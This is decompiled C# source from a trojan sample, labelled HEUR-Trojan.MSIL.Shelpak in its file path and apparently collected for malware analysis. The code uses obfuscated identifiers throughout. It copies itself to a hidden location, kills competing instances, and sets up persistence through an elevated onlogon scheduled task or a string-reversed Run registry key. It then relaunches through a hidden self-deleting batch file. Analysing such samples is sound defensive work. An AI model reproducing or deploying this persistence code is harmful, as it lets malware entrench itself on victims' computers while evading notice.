// Decompiled with JetBrains decompiler
// Type: 革言火父酉廾立幺白酉龜寸宀足己曰.斤龠疋風止厶卜犬面夕臣
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using 片水冫臼隶夕厂乙几犬二色里;
using 黃气骨黃工辵角爻匸斤匚欠虫;

namespace 革言火父酉廾立幺白酉龜寸宀足己曰
{
  internal class 斤龠疋風止厶卜犬面夕臣
  {
    public static void 赤舛虍艮瓦口阜廾禸工夂()
    {
      try
      {
        FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(非隶攴羊冂長口文立厂.革人瓦玉彡爿走金冫口儿子甘), 非隶攴羊冂長口文立厂.爪革土匕八幺身舌黹十文力));
        string fileName = Process.GetCurrentProcess().MainModule.FileName;
        if (!(fileName != fileInfo.FullName))
          return;
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            if (process.MainModule.FileName == fileInfo.FullName)
              process.Kill();
          }
          catch
          {
          }
        }
        if (火金女里勹毋舌鬯走犬瓦鹵木.立己女卩己鼓水疋聿廴干())
        {
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
          });
        }
        else
        {
          using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
            registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), (object) ("\"" + fileInfo.FullName + "\""));
        }
        if (File.Exists(fileInfo.FullName))
        {
          File.Delete(fileInfo.FullName);
          Thread.Sleep(1000);
        }
        FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
        byte[] numArray = File.ReadAllBytes(fileName);
        byte[] buffer = numArray;
        int length = numArray.Length;
        fileStream.Write(buffer, 0, length);
        火金女里勹毋舌鬯走犬瓦鹵木.臣田禾廾鳥戈歹弓入田牛();
        string path = Path.GetTempFileName() + ".bat";
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine("@echo off");
          streamWriter.WriteLine("timeout 3 > NUL");
          streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
          streamWriter.WriteLine("CD " + Path.GetTempPath());
          streamWriter.WriteLine("DEL \"" + Path.GetFileName(path) + "\" /f /q");
        }
        Process.Start(new ProcessStartInfo()
        {
          FileName = path,
          CreateNoWindow = true,
          ErrorDialog = false,
          UseShellExecute = false,
          WindowStyle = ProcessWindowStyle.Hidden
        });
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
      }
    }
  }
}
